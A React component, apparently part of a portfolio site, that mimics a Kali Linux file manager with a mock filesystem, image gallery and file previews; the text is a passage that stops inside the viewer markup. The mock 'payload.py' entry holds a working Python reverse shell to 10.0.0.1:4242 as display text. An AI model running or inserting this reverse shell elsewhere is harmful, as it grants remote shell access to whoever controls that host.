import React, { useState, useEffect, useRef } from 'react';
import { 
  ChevronLeft, 
  ChevronRight, 
  ArrowUp, 
  Home, 
  Search, 
  Menu,
  Folder,
  FileText,
  Image as ImageIcon,
  FileCode,
  Monitor,
  HardDrive,
  Download,
  Clock,
  Trash2,
  File,
  ChevronDown,
  X,
  Minus,
  Square,
  ExternalLink,
  Settings,
  Info,
  ShieldCheck,
  FileDigit,
  LayoutGrid,
  FileArchive,
  RefreshCcw,
  Key,
  Lock,
  Briefcase,
  GalleryVertical
} from 'lucide-react';

const MOCK_FS = {
  "/": { type: 'folder', name: '/', content: ['home', 'etc', 'bin', 'var', 'usr'] },
  "/home": { type: 'folder', name: 'home', content: ['kali'] },
  "/home/kali": { type: 'folder', name: 'kali', content: ['Desktop', 'Documents', 'Downloads', 'Music', 'Pictures', 'Videos', 'Public', 'Templates', 'Gallery', 'Crypt','Projects', '.bashrc'] },
  "/home/kali/Gallery": { type: 'folder', name: 'Gallery', content: ['1765569507044.jpg', 'IMG20251209102512.jpg', 'IMG20251211161344.jpg', '1734695335793.jpg','1734773045889.jpg','iitp.jpg'] },
  "/home/kali/Desktop": { type: 'folder', name: 'Desktop', content: ['nmap_scan.txt', 'kali_wallpaper.jpg', 'payload.py', 'server_log.txt','Crypt'] },
  "/home/kali/Documents": { type: 'folder', name: 'Documents', content: ['Report_2025.pdf', 'Work', 'Personal', 'Network_Topology.pdf'] },
  "/home/kali/Documents/Work": { type: 'folder', name: 'Work', content: ['Project_Alpha.pdf', 'Contracts'] },
  "/home/kali/Downloads": { type: 'folder', name: 'Downloads', content: ['wordlist.txt', 'kali_linux.iso','Semester-III_Transcript.pdf','Ankit CV Resume.pdf'] },
  "/home/kali/Pictures": { type: 'folder', name: 'Pictures', content: ['sc_kali_1.png', 'sc_kali_2.png', 'background.jpg','wallpapers','Hachathons','Events'] },
  "/home/kali/Crypt": { type: 'folder', name: 'Crypt', content: ['private_key.pem', 'vault_entry.gpg', 'safe_box.jpg', 'passwords.encrypted'] },
  "/home/kali/Pictures/Hachathons": { type: 'folder', name: 'Hachathons', content: ['12345678.png', 'certificate.jpg','Hack N Tech','Hack 4 Brahma'] },
  "/home/kali/Pictures/Events": { type: 'folder', name: 'Events', content: ['Google DeveFest Patna'] },
  "/home/kali/Pictures/Hachathons/Hack N Tech": { type: 'folder', name: 'Hack N Tech', content: ['WhatsApp Image 2026-01-19 at 3.03.13 AM.jpeg', 'WhatsApp Image 2026-01-19 at 3.03.09 AM.jpeg','WhatsApp Image 2026-01-19 at 3.03.10 AM.jpeg','WhatsApp Image 2026-01-19 at 3.03.11 AM.jpeg','WhatsApp Image 2026-01-19 at 3.03.12 AM (1).jpeg','WhatsApp Image 2026-01-19 at 3.03.12 AM (2).jpeg','WhatsApp Image 2026-01-19 at 3.03.12 AM.jpeg'] },
  "/home/kali/Pictures/Hachathons/Hack 4 Brahma": { type: 'folder', name: 'Hack 4 Brahma', content: ['123.png', 'certificate.jpg','IMG20251012111417.jpg','IMG_20251011_131322.jpg','IMG_20251011_195612_299.jpg'] },
  "/home/kali/Pictures/Events/Google DeveFest Patna": { type: 'folder', name: 'Google DeveFest Patna', content: ['WhatsApp Image 2026-01-19 at 2.33.56 AM.jpeg', 'cop_gdg.jpg', 'WhatsApp Image 2026-01-19 at 2.33.56 AM (1).jpeg', 'WhatsApp Image 2026-01-19 at 2.33.55 AM.jpeg', 'WhatsApp Image 2026-01-19 at 2.33.55 AM (1).jpeg','IMG20251227101310.jpg'] },
  // Projects Section Consolidating all requested folders
  "/home/kali/Projects": { type: 'folder', name: 'Projects', content: ['Hachathons', 'Events', 'Web_Exploiter', 'Network_Scanner_v2', 'Crypt','Project_waves','IITP Companion','IITPCEP','Food Factory','IKon','Buzzi','Telegram Bots','Extensions','Youtube Downloader','Ai Chatbot','Humanoide Robot','Birthday','Surprise','Infinte Scroller','Web Scroller','Code Alpha','Bujji Ai','Php','Node','Django','Capstone Projects','Expense Tracker','Attendence System', 'Project_Specs.pdf', 'main_logic.py', 'Database_Backup.zip'] },
  
  // Projects Subfolders
  "/home/kali/Projects/Hachathons": { type: 'folder', name: 'Hachathons', content: ['12345678.png', 'certificate.jpg', 'Hack N Tech', 'Hack 4 Brahma'] },
  "/home/kali/Projects/Events": { type: 'folder', name: 'Events', content: ['Google DeveFest Patna'] },
  "/home/kali/Projects/Crypt": { type: 'folder', name: 'Crypt', content: ['private_key.pem', 'vault_entry.gpg', 'passwords.encrypted', 'safe_box.jpg'] },
  "/home/kali/Projects/Web_Exploiter": { type: 'folder', name: 'Web_Exploiter', content: ['payload.js', 'target_list.txt'] },
  "/home/kali/Projects/Network_Scanner_v2": { type: 'folder', name: 'Network_Scanner_v2', content: ['scanner.py', 'results.json'] },
  "/home/kali/Projects/Project_waves": { type: 'folder', name: 'Project_waves', content: ['app.py', 'requirements.txt'] },
  "/home/kali/Projects/IITP Companion": { type: 'folder', name: 'IITP Companion', content: ['companion.js', 'styles.css'] },
  "/home/kali/Projects/IITPCEP": { type: 'folder', name: 'IITPCEP', content: ['main.py', 'config.yaml'] },
  "/home/kali/Projects/Food Factory": { type: 'folder', name: 'Food Factory', content: ['order_system.py', 'menu.pdf'] },
  "/home/kali/Projects/IKon": { type: 'folder', name: 'IKon', content: ['ikon_app.js', 'database.db'] },
  "/home/kali/Projects/Buzzi": { type: 'folder', name: 'Buzzi', content: ['buzzi_frontend.html', 'buzzi_backend.py'] },
  "/home/kali/Projects/Telegram Bots": { type: 'folder', name: 'Telegram Bots', content: ['bot1.py', 'bot2.py'] },
  "/home/kali/Projects/Extensions": { type: 'folder', name: 'Extensions', content: ['ext1.js', 'ext2.js'] },
  "/home/kali/Projects/Youtube Downloader": { type: 'folder', name: 'Youtube Downloader', content: ['downloader.py', 'requirements.txt'] },
  "/home/kali/Projects/Ai Chatbot": { type: 'folder', name: 'Ai Chatbot', content: ['chatbot.py', 'responses.json'] },
  "/home/kali/Projects/Humanoide Robot": { type: 'folder', name: 'Humanoide Robot', content: ['robot_control.py', 'sensors.py'] },
  "/home/kali/Projects/Birthday": { type: 'folder', name: 'Birthday', content: ['invite_list.txt', 'event_plan.pdf'] },
  "/home/kali/Projects/Surprise": { type: 'folder', name: 'Surprise', content: ['surprise_ideas.txt', 'budget.xlsx'] },
  "/home/kali/Projects/Infinte Scroller": { type: 'folder', name: 'Infinte Scroller', content: ['scroller.js', 'styles.css'] },
  "/home/kali/Projects/Web Scroller": { type: 'folder', name: 'Web Scroller', content: ['web_scroller.py', 'config.json'] },
  "/home/kali/Projects/Code Alpha": { type: 'folder', name: 'Code Alpha', content: ['alpha.py', 'data.csv'] },
  "/home/kali/Projects/Bujji Ai": { type: 'folder', name: 'Bujji Ai', content: ['bujji_ai.py', 'training_data.json'] },
  "/home/kali/Projects/Php": { type: 'folder', name: 'Php', content: ['index.php', 'config.php'] },
  "/home/kali/Projects/Node": { type: 'folder', name: 'Node', content: ['app.js', 'package.json'] },
  "/home/kali/Projects/Django": { type: 'folder', name: 'Django', content: ['manage.py', 'settings.py'] },
  "/home/kali/Projects/Capstone Projects": { type: 'folder', name: 'Capstone Projects', content: ['project1', 'project2'] },
  "/home/kali/Projects/Expense Tracker": { type: 'folder', name: 'Expense Tracker', content: ['tracker.py', 'expenses.csv'] },
  "/home/kali/Projects/Attendence System": { type: 'folder', name: 'Attendence System', content: ['attendence.py', 'students.csv'] },


  // New Crypt Folder on Desktop
  "/home/kali/Desktop/Crypt": { type: 'folder', name: 'Crypt', content: ['private_key.pem', 'vault_entry.gpg', 'passwords.encrypted', 'safe_box.jpg'] },
  "/home/kali/Pictures/wallpapers": { type: 'folder', name: 'wallpapers', content: ['wallpaper1.jpg', 'wallpaper2.jpg', 'wallpaper3.jpg', 'wallpaper4.jpg', 'wallpaper5.jpg', 'wallpaper6.jpg', 'wallpaper7.jpg', 'wallpaper8.jpg'] },
  "/trash": { type: 'folder', name: 'trash', content: ['old_exploit.py', 'obsolete_config.conf', 'deleted_screenshot.png'] },
  "file_metadata": {
    "nmap_scan.txt": { type: 'text', content: "Starting Nmap 7.92 ( https://nmap.org ) at 2024-05-20 10:00 EDT\nNmap scan report for 192.168.1.1\nHost is up (0.0020s latency).\nNot shown: 998 closed ports\nPORT    STATE SERVICE\n22/tcp  open  ssh\n80/tcp  open  http", icon: <FileText size={48} className="text-blue-400" /> },
    "server_log.txt": { type: 'text', content: "[INFO] Server started at :8080\n[DEBUG] Payload received\n[WARN] High latency detected", icon: <FileText size={48} className="text-blue-400" /> },
    "payload.py": { type: 'text', content: "import socket,os,pty\ns=socket.socket(socket.AF_INET,socket.SOCK_STREAM)\ns.connect(('10.0.0.1',4242))\nos.dup2(s.fileno(),0)\nos.dup2(s.fileno(),1)\nos.dup2(s.fileno(),2)\npty.spawn('/bin/bash')", icon: <FileCode size={48} className="text-emerald-400" /> },
    "kali_wallpaper.jpg": { type: 'image', url: './images/wallpapers/wall-1.webp', icon: <ImageIcon size={48} className="text-purple-400" /> },
    "background.jpg": { type: 'image', url: './images/wallpapers/wall-8.webp', icon: <ImageIcon size={48} className="text-purple-400" /> },
    "sc_kali_1.png": { type: 'image', url: 'https://images.unsplash.com/photo-1558494949-ef010cbdcc48?auto=format&fit=crop&q=80&w=1200', icon: <ImageIcon size={48} className="text-purple-400" /> },
    "sc_kali_2.png": { type: 'image', url: 'https://images.unsplash.com/photo-1518770660439-4636190af475?auto=format&fit=crop&q=80&w=1200', icon: <ImageIcon size={48} className="text-purple-400" /> },
    "Report_2025.pdf": { type: 'pdf', url: './images/me/finnal CSDA quiz 1.pdf', icon: <FileDigit size={48} className="text-red-400" /> },
    "Network_Topology.pdf": { type: 'pdf', url: './images/me/Introduction to Linux and its shell.pdf', icon: <FileDigit size={48} className="text-red-400" /> },
    "Project_Alpha.pdf": { type: 'pdf', url: 'https://unec.edu.az/application/uploads/2014/12/pdf-sample.pdf', icon: <FileDigit size={48} className="text-red-400" /> },
    "wordlist.txt": { type: 'text', content: "admin\npassword\n123456\nqwerty\nroot\ntest", icon: <FileText size={48} className="text-blue-400" /> },
    
    // Crypt Folder Items
    "private_key.pem": { type: 'text', content: "-----BEGIN RSA PRIVATE KEY-----\nMIIEpAIBAAKCAQEA7V+Y/S3...\n-----END RSA PRIVATE KEY-----", icon: <Key size={48} className="text-yellow-500" /> },
    "vault_entry.gpg": { type: 'text', content: "PGP MESSAGE...\nVersion: GnuPG v2\n\nhIwD7bX...", icon: <Lock size={48} className="text-orange-400" /> },
    "safe_box.jpg": { type: 'image', url: 'https://images.unsplash.com/photo-1516321318423-f06f85e504b3?auto=format&fit=crop&q=80&w=1200', icon: <ImageIcon size={48} className="text-orange-300" /> },
    "passwords.encrypted": { type: 'text', content: "U2FsdGVkX19/YmFyYmFyYmFyYmFy...", icon: <ShieldCheck size={48} className="text-emerald-500" /> },
    // Trash Metadata
    "old_exploit.py": { type: 'text', content: "# This script is deprecated\n# Fixed CVE-2021-34527\nprint('Running legacy check...')", icon: <FileCode size={48} className="text-gray-500" /> },
    "obsolete_config.conf": { type: 'text', content: "ServerName legacy.local\nDocumentRoot /var/www/old", icon: <Settings size={48} className="text-gray-500" /> },
    "deleted_screenshot.png": { type: 'image', url: 'https://images.unsplash.com/photo-1516321318423-f06f85e504b3?auto=format&fit=crop&q=80&w=1200', icon: <ImageIcon size={48} className="text-gray-500" /> },
    // wallpapers
    "wallpaper1.jpg": { type: 'image', url: './images/wallpapers/wall-1.webp', icon: <ImageIcon size={48} className="text-purple-400" /> },
    "wallpaper2.jpg": { type: 'image', url: './images/wallpapers/wall-2.webp', icon: <ImageIcon size={48} className="text-purple-400" /> },
    "wallpaper3.jpg": { type: 'image', url: './images/wallpapers/wall-3.webp', icon: <ImageIcon size={48} className="text-purple-400" /> },
    "wallpaper4.jpg": { type: 'image', url: './images/wallpapers/wall-4.webp', icon: <ImageIcon size={48} className="text-purple-400" /> },
    "wallpaper5.jpg": { type: 'image', url: './images/wallpapers/wall-5.webp', icon: <ImageIcon size={48} className="text-purple-400" /> },
    "wallpaper6.jpg": { type: 'image', url: './images/wallpapers/wall-6.webp', icon: <ImageIcon size={48} className="text-purple-400" /> },
    "wallpaper7.jpg": { type: 'image', url: './images/wallpapers/wall-7.webp', icon: <ImageIcon size={48} className="text-purple-400" /> },
    "wallpaper8.jpg": { type: 'image', url: './images/wallpapers/wall-8.webp', icon: <ImageIcon size={48} className="text-purple-400" /> },
    //gallery images
    "1765569507044.jpg": { type: 'image', url: './images/me/1765569507044.jpg', icon: <ImageIcon size={48} className="text-purple-400" /> },
    "IMG20251209102512.jpg": { type: 'image', url: './images/me/IMG20251209102512.jpg', icon: <ImageIcon size={48} className="text-purple-400" /> },
    "IMG20251211161344.jpg": { type: 'image', url: './images/me/IMG20251211161344.jpg', icon: <ImageIcon size={48} className="text-purple-400" /> },
    "1734695335793.jpg": { type: 'image', url: './images/me/1734695335793.jpg', icon: <ImageIcon size={48} className="text-purple-400" /> },
    "1734773045889.jpg": { type: 'image', url: './images/me/1734773045889.jpg', icon: <ImageIcon size={48} className="text-purple-400" /> },
    "iitp.jpg": { type: 'image', url: './images/me/iitp.jpg', icon: <ImageIcon size={48} className="text-purple-400" /> },
    //hackathons and events images
    "12345678.png": { type: 'image', url: './images/me/12345678.png', icon: <ImageIcon size={48} className="text-purple-400" /> },
    "certificate.jpg": { type: 'image', url: './images/me/certificate.jpg', icon: <ImageIcon size={48} className="text-purple-400" /> },
    "123.png": { type: 'image', url: './images/me/123.png', icon: <ImageIcon size={48} className="text-purple-400" /> },
    "certificate.jpg": { type: 'image', url: './images/me/certificate.jpg', icon: <ImageIcon size={48} className="text-purple-400" /> },
    "WhatsApp Image 2026-01-19 at 2.33.56 AM.jpeg": { type: 'image', url: './images/me/WhatsApp Image 2026-01-19 at 2.33.56 AM.jpeg', icon: <ImageIcon size={48} className="text-purple-400" /> },
    "cop_gdg.jpg": { type: 'image', url: './images/me/cop_gdg.jpg', icon: <ImageIcon size={48} className="text-purple-400" /> },
    "WhatsApp Image 2026-01-19 at 2.33.56 AM (1).jpeg": { type: 'image', url: './images/me/WhatsApp Image 2026-01-19 at 2.33.56 AM (1).jpeg', icon: <ImageIcon size={48} className="text-purple-400" /> },
    "WhatsApp Image 2026-01-19 at 2.33.55 AM.jpeg": { type: 'image', url: './images/me/WhatsApp Image 2026-01-19 at 2.33.55 AM.jpeg', icon: <ImageIcon size={48} className="text-purple-400" /> },
    "WhatsApp Image 2026-01-19 at 2.33.55 AM (1).jpeg": { type: 'image', url: './images/me/WhatsApp Image 2026-01-19 at 2.33.55 AM (1).jpeg', icon: <ImageIcon size={48} className="text-purple-400" /> },
    "IMG20251227101310.jpg": { type: 'image', url: './images/me/IMG20251227101310.jpg', icon: <ImageIcon size={48} className="text-purple-400" /> },
    "IMG_20251011_195612_299.jpg": { type: 'image', url: './images/me/IMG_20251011_195612_299.jpg', icon: <ImageIcon size={48} className="text-purple-400" /> },
    "IMG_20251011_131322.jpg": { type: 'image', url: './images/me/IMG_20251011_131322.jpg', icon: <ImageIcon size={48} className="text-purple-400" /> },
    "IMG20251012111417.jpg": { type: 'image', url: './images/me/IMG20251012111417.jpg', icon: <ImageIcon size={48} className="text-purple-400" />  },
    "WhatsApp Image 2026-01-19 at 3.03.13 AM.jpeg": { type: 'image', url: './images/me/WhatsApp Image 2026-01-19 at 3.03.13 AM.jpeg', icon: <ImageIcon size={48} className="text-purple-400" /> },
    "WhatsApp Image 2026-01-19 at 3.03.09 AM.jpeg": { type: 'image', url: './images/me/WhatsApp Image 2026-01-19 at 3.03.09 AM.jpeg', icon: <ImageIcon size={48} className="text-purple-400" /> },
    "WhatsApp Image 2026-01-19 at 3.03.10 AM.jpeg": { type: 'image', url: './images/me/WhatsApp Image 2026-01-19 at 3.03.10 AM.jpeg', icon: <ImageIcon size={48} className="text-purple-400" /> },
    "WhatsApp Image 2026-01-19 at 3.03.11 AM.jpeg": { type: 'image', url: './images/me/WhatsApp Image 2026-01-19 at 3.03.11 AM.jpeg', icon: <ImageIcon size={48} className="text-purple-400" /> },
    "WhatsApp Image 2026-01-19 at 3.03.12 AM (1).jpeg": { type: 'image', url: './images/me/WhatsApp Image 2026-01-19 at 3.03.12 AM (1).jpeg', icon: <ImageIcon size={48} className="text-purple-400" /> },
    "WhatsApp Image 2026-01-19 at 3.03.12 AM (2).jpeg": { type: 'image', url: './images/me/WhatsApp Image 2026-01-19 at 3.03.12 AM (2).jpeg', icon: <ImageIcon size={48} className="text-purple-400" /> },
    "WhatsApp Image 2026-01-19 at 3.03.12 AM.jpeg": { type: 'image', url: './images/me/WhatsApp Image 2026-01-19 at 3.03.12 AM.jpeg', icon: <ImageIcon size={48} className="text-purple-400" /> },
    "Semester-III_Transcript.pdf": { type: 'pdf', url: './images/me/Semester-III_Transcript.pdf', icon: <FileDigit size={48} className="text-red-400" /> },
    "Professional CV Resume Ankit.pdf": { type: 'pdf', url: './images/me/Professional CV Resume Ankit.pdf', icon: <FileDigit size={48} className="text-red-400" /> }
  }
};

const MENU_DATA = {
  File: ['New Tab', 'New Window', 'Create Folder', 'Properties', 'Close'],
  Edit: ['Cut', 'Copy', 'Paste', 'Select All'],
  View: ['Side Pane', 'Toolbar', 'Statusbar', 'Hidden Files'],
  Go: ['Back', 'Forward', 'Up', 'Home', 'Trash'],
  Help: ['Contents', 'About Thunar']
};

const App = (props) => {
  const initialPath = props.initialPath || '/home/kali';
  const initialView = initialPath === '/trash' ? 'trash' : 'home';

  const [currentPath, setCurrentPath] = useState(initialPath);
  const [activeView, setActiveView] = useState(initialView); 
  const [history, setHistory] = useState([initialPath]);
  const [historyIndex, setHistoryIndex] = useState(0);
  const [addressBarValue, setAddressBarValue] = useState(initialPath);
  const [selectedItem, setSelectedItem] = useState(null);
  const [activeMenu, setActiveMenu] = useState(null);
  const [isMaximized, setIsMaximized] = useState(true);
  const [openFile, setOpenFile] = useState(null);
  const [showMobileSidebar, setShowMobileSidebar] = useState(false);
  
  const [isTrashEmpty, setIsTrashEmpty] = useState(() => {
    return localStorage.getItem("trash-empty") === "true";
  });

  const menuRef = useRef(null);

  useEffect(() => {
    const handleClickOutside = (event) => {
      if (menuRef.current && !menuRef.current.contains(event.target)) {
        setActiveMenu(null);
      }
    };
    document.addEventListener('mousedown', handleClickOutside);
    return () => document.removeEventListener('mousedown', handleClickOutside);
  }, []);

  useEffect(() => {
    setAddressBarValue(currentPath);
  }, [currentPath]);

  const navigateTo = (path, viewType = null) => {
    const targetPath = viewType === 'trash' ? '/trash' : path;
    const targetView = viewType === 'trash' ? 'trash' : (viewType || 'home');

    if (!MOCK_FS[targetPath] && !targetPath.includes('.')) return;
    
    const newHistory = history.slice(0, historyIndex + 1);
    newHistory.push(targetPath);
    setHistory(newHistory);
    setHistoryIndex(newHistory.length - 1);
    
    setCurrentPath(targetPath);
    setActiveView(targetView);
    setSelectedItem(null);
    setShowMobileSidebar(false);
  };

  const handleItemDoubleClick = (itemName) => {
    const fullPath = currentPath === '/' ? `/${itemName}` : `${currentPath}/${itemName}`;
    if (MOCK_FS[fullPath]) {
      navigateTo(fullPath);
    } else {
      const fileData = MOCK_FS.file_metadata[itemName];
      if (fileData) {
        setOpenFile({ name: itemName, ...fileData });
      }
    }
  };

  const goBack = () => {
    if (historyIndex > 0) {
      const prevPath = history[historyIndex - 1];
      setHistoryIndex(historyIndex - 1);
      setCurrentPath(prevPath);
      setActiveView(prevPath === '/trash' ? 'trash' : 'home');
    }
  };

  const goUp = () => {
    if (currentPath === '/' || currentPath === '/trash') return;
    const parts = currentPath.split('/').filter(Boolean);
    parts.pop();
    const parentPath = '/' + parts.join('/');
    navigateTo(parentPath || '/');
  };

  const emptyTrash = () => {
    setIsTrashEmpty(true);
    localStorage.setItem("trash-empty", "true");
  };

  const restoreTrash = () => {
    setIsTrashEmpty(false);
    localStorage.setItem("trash-empty", "false");
  };

  const navigateImage = (direction) => {
    const images = getImagesInCurrentDir();
    const currentIndex = images.indexOf(openFile.name);
    let nextIndex = direction === 'next' ? currentIndex + 1 : currentIndex - 1;
    if (nextIndex >= images.length) nextIndex = 0;
    if (nextIndex < 0) nextIndex = images.length - 1;
    const nextImageName = images[nextIndex];
    setOpenFile({ name: nextImageName, ...MOCK_FS.file_metadata[nextImageName] });
  };

  const getImagesInCurrentDir = () => {
    const dirItems = MOCK_FS[currentPath]?.content || [];
    return dirItems.filter(name => MOCK_FS.file_metadata[name]?.type === 'image');
  };

  const handleAddressSubmit = (e) => {
    if (e.key === 'Enter') {
      const target = addressBarValue.trim();
      if (MOCK_FS[target]) navigateTo(target);
      else setAddressBarValue(currentPath);
    }
  };

  const items = (currentPath === '/trash' && isTrashEmpty) ? [] : (MOCK_FS[currentPath]?.content || []);

  const SidebarLink = ({ icon: Icon, label, path, viewKey }) => {
    const isActive = (viewKey === 'trash' && currentPath === '/trash') || 
                     (viewKey !== 'trash' && currentPath === path && currentPath !== '/trash');
    return (
      <div 
        onClick={() => navigateTo(path, viewKey)}
        className={`flex items-center gap-3 px-3 py-2 cursor-default transition-all rounded-lg mx-2 ${
          isActive 
            ? 'bg-[#3b82f6] text-white shadow-lg' 
            : 'text-gray-400 hover:bg-white/5 hover:text-gray-200'
        }`}
      >
        <Icon size={18} className={isActive ? 'text-white' : 'text-blue-400'} />
        <span className="text-[13px] font-medium tracking-tight whitespace-nowrap">{label}</span>
      </div>
    );
  };

  return (
    <div className={`flex flex-col h-full w-full bg-[#0f1115] text-[#e1e3e6] font-sans select-none overflow-hidden transition-all duration-500 ${!isMaximized ? 'rounded-2xl border border-[#30343d] shadow-2xl scale-[0.98]' : ''}`}>

      {/* Menu Bar */}
      <div className="flex items-center gap-1 px-2 py-1 bg-[#181a1f] border-b border-[#2a2e35] text-[12px] relative z-[60]" ref={menuRef}>
        <button onClick={() => setShowMobileSidebar(!showMobileSidebar)} className="md:hidden p-1.5 hover:bg-white/5 rounded-lg mr-2 text-blue-400">
           <Menu size={18} />
        </button>
        {Object.keys(MENU_DATA).map((menu) => (
          <div key={menu} className="hidden md:block relative">
            <button 
              onMouseDown={() => setActiveMenu(activeMenu === menu ? null : menu)}
              className={`px-3 py-1 rounded-md transition-all ${activeMenu === menu ? 'bg-[#3b82f6] text-white' : 'hover:bg-white/5 text-gray-500 hover:text-gray-200'}`}
            >
              {menu}
            </button>
            {activeMenu === menu && (
              <div className="absolute top-[calc(100%+2px)] left-0 min-w-[180px] bg-[#181a1f] border border-[#2a2e35] shadow-2xl rounded-lg z-[100] py-1.5 backdrop-blur-md">
                {MENU_DATA[menu].map((item) => (
                  <div key={item} className="px-3 py-1.5 hover:bg-[#3b82f6] hover:text-white transition-colors cursor-default text-[12px] flex justify-between items-center group mx-1 rounded-md">
                    {item}
                    <span className="text-[9px] opacity-40 uppercase">Alt+{item[0]}</span>
                  </div>
                ))}
              </div>
            )}
          </div>
        ))}
        <div className="flex-1" />
        <div className="flex items-center gap-1.5 pr-2">
            <ShieldCheck size={14} className="text-blue-500" />
            <span className="text-[10px] font-black text-gray-500 uppercase tracking-widest">Production ESR</span>
        </div>
      </div>

      {/* Toolbar */}
      <div className="flex flex-wrap items-center gap-3 p-3 bg-[#111318] border-b border-[#2a2e35] shadow-inner">
        <div className="flex items-center gap-1">
          <button onClick={goBack} disabled={historyIndex === 0} className={`w-9 h-9 flex items-center justify-center rounded-xl transition-all ${historyIndex === 0 ? 'opacity-20 cursor-not-allowed text-gray-600' : 'hover:bg-white/5 text-blue-400'}`}>
            <ChevronLeft size={20} strokeWidth={2.5} />
          </button>
          <button onClick={goUp} className="w-9 h-9 flex items-center justify-center rounded-xl hover:bg-white/5 text-blue-400">
            <ArrowUp size={20} strokeWidth={2.5} />
          </button>
          <button onClick={() => navigateTo('/home/kali')} className="w-9 h-9 flex items-center justify-center rounded-xl hover:bg-white/5 text-blue-400">
            <Home size={20} strokeWidth={2} />
          </button>
        </div>

        <div className="flex-1 min-w-[200px] flex items-center bg-[#0a0c0f] border border-[#2a2e35] rounded-xl h-10 px-4 shadow-inner focus-within:ring-2 focus-within:ring-[#3b82f6]/30 transition-all">
          <Folder size={14} className="text-blue-500 mr-3" />
          <input 
            type="text" 
            value={addressBarValue}
            onChange={(e) => setAddressBarValue(e.target.value)}
            onKeyDown={(e) => e.key === 'Enter' && navigateTo(addressBarValue)}
            className="w-full text-[13px] outline-none bg-transparent text-gray-300 font-mono tracking-tight"
          />
        </div>

        <div className="hidden lg:flex items-center gap-2">
          <div className="relative group">
            <Search size={14} className="absolute left-3.5 top-2.5 text-gray-500 group-focus-within:text-blue-400 transition-colors" />
            <input type="text" placeholder="Search..." className="bg-[#0a0c0f] border border-[#2a2e35] rounded-full pl-10 pr-4 py-2 text-[12px] w-40 focus:w-56 transition-all outline-none text-gray-200" />
          </div>
          <button className="w-10 h-10 flex items-center justify-center rounded-xl hover:bg-white/5 text-gray-400"><LayoutGrid size={20} /></button>
        </div>
      </div>

      <div className="flex flex-1 overflow-hidden relative">
        <div className={`${showMobileSidebar ? 'flex absolute inset-0 z-50 shadow-2xl' : 'hidden'} md:flex md:relative w-60 bg-[#14171c] border-r border-[#2a2e35] py-4 flex flex-col gap-6 overflow-y-auto`}>
          <div>
            <div className="text-[10px] font-bold text-gray-600 uppercase tracking-[2px] mb-3 px-6 opacity-60 font-black">Places</div>
            <div className="flex flex-col gap-0.5">
              <SidebarLink icon={Clock} label="Recent" path="/home/kali" viewKey="recent" />
              <SidebarLink icon={GalleryVertical} label="Gallery" path="/home/kali/Gallery" viewKey="gallery" />
              <SidebarLink icon={Home} label="Home" path="/home/kali" viewKey="home" />
              <SidebarLink icon={Briefcase} label="Projects" path="/home/kali/Projects" viewKey="projects" />
              <SidebarLink icon={Monitor} label="Desktop" path="/home/kali/Desktop" />
              <SidebarLink icon={FileText} label="Documents" path="/home/kali/Documents" />
              <SidebarLink icon={Download} label="Downloads" path="/home/kali/Downloads" />
              <SidebarLink icon={ImageIcon} label="Pictures" path="/home/kali/Pictures" />
              <SidebarLink icon={Trash2} label="Trash" path="/trash" viewKey="trash" />
            </div>
          </div>
          <div className="px-6"><div className="h-px bg-[#2a2e35]" /></div>
          <div>
            <div className="text-[10px] font-bold text-gray-600 uppercase tracking-[2px] mb-3 px-6 opacity-60 font-black">Devices</div>
            <div className="flex flex-col gap-0.5">
              <SidebarLink icon={HardDrive} label="File System" path="/" />
              <SidebarLink icon={ExternalLink} label="Browse Network" path="/" />
            </div>
          </div>
        </div>

        <div className="flex-1 p-4 md:p-6 bg-[#0f1115] overflow-y-auto custom-scrollbar relative" onClick={() => setSelectedItem(null)}>
          <div className="grid grid-cols-[repeat(auto-fill,minmax(100px,1fr))] md:grid-cols-[repeat(auto-fill,minmax(110px,1fr))] gap-3">
            {items.map((itemName) => {
              const fullPath = currentPath === '/' ? `/${itemName}` : `${currentPath}/${itemName}`;
              const isFolder = MOCK_FS[fullPath];
              const isSelected = selectedItem === itemName;
              const fileInfo = MOCK_FS.file_metadata[itemName];
              const icon = isFolder 
                ? <Folder size={48} className="text-blue-500 fill-blue-500/10 filter drop-shadow-md" /> 
                : (fileInfo?.icon || <File size={48} className="text-gray-500" />);

              return (
                <div 
                  key={itemName}
                  onClick={(e) => { e.stopPropagation(); setSelectedItem(itemName); }}
                  onDoubleClick={() => handleItemDoubleClick(itemName)}
                  className={`flex flex-col items-center p-3 rounded-xl cursor-default transition-all group border ${
                    isSelected ? 'bg-[#3b82f6]/20 text-white border-[#3b82f6]/40 shadow-xl scale-105 z-10' : 'hover:bg-white/5 border-transparent'
                  }`}
                >
                  <div className="mb-2 relative transition-transform active:scale-95">{icon}</div>
                  <span className={`text-[11px] md:text-[12px] text-center break-all line-clamp-2 px-1.5 rounded leading-tight font-medium ${isSelected ? 'text-white bg-[#3b82f6] rounded px-2 shadow-lg' : 'text-gray-300'}`}>{itemName}</span>
                </div>
              );
            })}
          </div>

          {items.length === 0 && (
            <div className="flex flex-col items-center justify-center h-full text-gray-700 opacity-40 animate-in fade-in zoom-in-95">
              {currentPath === '/trash' ? (
                  <div className="flex flex-col items-center">
                    <Trash2 size={80} strokeWidth={1} className="mb-4" />
                    <p className="text-lg font-bold tracking-widest uppercase">Trash is empty</p>
                    <button onClick={restoreTrash} className="mt-4 text-[10px] underline hover:text-white transition-colors cursor-pointer">Restore Mock Objects</button>
                  </div>
              ) : (
                  <div className="flex flex-col items-center">
                    <Folder size={80} strokeWidth={1} className="mb-4" />
                    <p className="text-lg font-bold tracking-widest uppercase">Empty Directory</p>
                  </div>
              )}
            </div>
          )}

          {/* VIEWER OVERLAY */}
          {openFile && (
            <div className="absolute inset-2 md:inset-6 bg-[#181a1f] border border-[#2a2e35] shadow-[0_30px_60px_rgba(0,0,0,0.8)] rounded-2xl z-[100] flex flex-col animate-in">
              <div className="flex items-center justify-between bg-[#111318] border-b border-[#2a2e35] px-4 py-3 rounded-t-2xl">
                <div className="flex items-center gap-3">
                  <ShieldCheck size={16} className="text-blue-500" />
                  <span className="text-[11px] font-black text-gray-500 uppercase tracking-widest truncate max-w-[150px] md:max-w-none">{openFile.name} — Preview</span>
                </div>
                <button onClick={() => setOpenFile(null)} className="p-1.5 hover:bg-[#ef4444] text-gray-500 hover:text-white rounded-lg transition-all"><X size={18} /></button>
              </div>
              <div className="flex-1 overflow-auto p-4 md:p-6 bg-[#0a0c0f] rounded-b-2xl relative">
                {openFile.type === 'text' && <textarea className="w-full h-full bg-transparent text-gray-300 font-mono text-[13px] leading-relaxed outline-none resize-none custom-scrollbar" value={openFile.content} readOnly />}
